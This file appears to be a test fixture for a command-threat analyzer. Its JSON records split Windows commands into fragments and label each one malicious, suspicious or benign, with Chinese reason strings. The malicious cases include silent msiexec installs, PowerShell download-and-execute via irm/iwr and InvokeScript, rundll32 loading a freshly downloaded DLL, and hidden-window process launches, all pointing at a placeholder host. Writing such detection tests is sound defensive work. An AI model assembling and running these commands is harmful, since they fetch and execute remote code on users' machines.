{"id": "command.1b.win.msiexec-quiet-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["msi", "exec /q /i ht", "tps://example.invalid/a.msi"]}, "expect": {"level": "malicious", "reasons_contain": ["靜默安裝"]}, "tags": ["windows", "clickfix"]}
{"id": "command.1b.win.msiexec-quiet-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["msi", "exec.exe -i ht", "tps://example.invalid/a.msi -qn"]}, "expect": {"level": "malicious"}, "tags": ["windows"]}
{"id": "command.1b.win.msiexec-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["msi", "exec /i ht", "tps://example.invalid/a.msi"]}, "expect": {"level": "suspicious"}, "tags": ["windows"], "note": "with the install UI the user still sees what is installed"}
{"id": "command.1b.win.msiexec-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["msi", "exec /i C:\\Installers\\node-v20.15.0-x64.msi /qn"]}, "expect": {"level": "none"}, "tags": ["windows"]}
{"id": "command.1b.win.invoke-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["$ExecutionContext.Inv", "okeCommand.Inv", "okeScript((i", "rm ht", "tps://example.invalid/a))"]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行"]}, "tags": ["windows"]}
{"id": "command.1b.win.invoke-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["$ExecutionContext.Inv", "okeCommand.NewSc", "riptBlock((i", "wr ht", "tps://example.invalid/a -UseBasicParsing).Content).Inv", "oke()"]}, "expect": {"level": "malicious"}, "tags": ["windows"]}
{"id": "command.1b.win.invoke-003", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "wr ht", "tps://example.invalid/a.ps1 -OutFile a.ps1; Inv", "oke-Command -FilePath .\\a.ps1"]}, "expect": {"level": "malicious"}, "tags": ["windows"]}
{"id": "command.1b.win.invoke-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["Inv", "oke-Command -ComputerName srv01 -ScriptBlock { Get-Service }"]}, "expect": {"level": "none"}, "tags": ["windows"]}
{"id": "command.1b.win.rundll32-dll-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "wr ht", "tps://example.invalid/a.dll -OutFile $env:TEMP\\a.dll; rund", "ll32 $env:TEMP\\a.dll,Start"]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行"]}, "tags": ["windows"]}
{"id": "command.1b.win.rundll32-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["rund", "ll32 user32.dll,LockWorkStation"]}, "expect": {"level": "none"}, "tags": ["windows"]}
{"id": "command.1b.win.hidden-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["Start-Process power", "shell -WindowStyle Hid", "den -ArgumentList '-c calc'"]}, "expect": {"level": "malicious", "reasons_contain": ["隱藏視窗"]}, "tags": ["windows"], "note": "already covered by the legacy pattern"}
{"id": "command.1b.win.hidden-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["power", "shell -c \"$i=New-Object Diagnostics.ProcessStartInfo 'calc'; $i.WindowStyle='Hid", "den'; [Diagnostics.Process]::Start($i)\""]}, "expect": {"level": "malicious", "reasons_contain": ["隱藏視窗"]}, "tags": ["windows"]}
{"id": "command.1b.win.hidden-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["[Diagnostics.ProcessWindowStyle]::Hid", "den"]}, "expect": {"level": "none"}, "tags": ["windows"]}
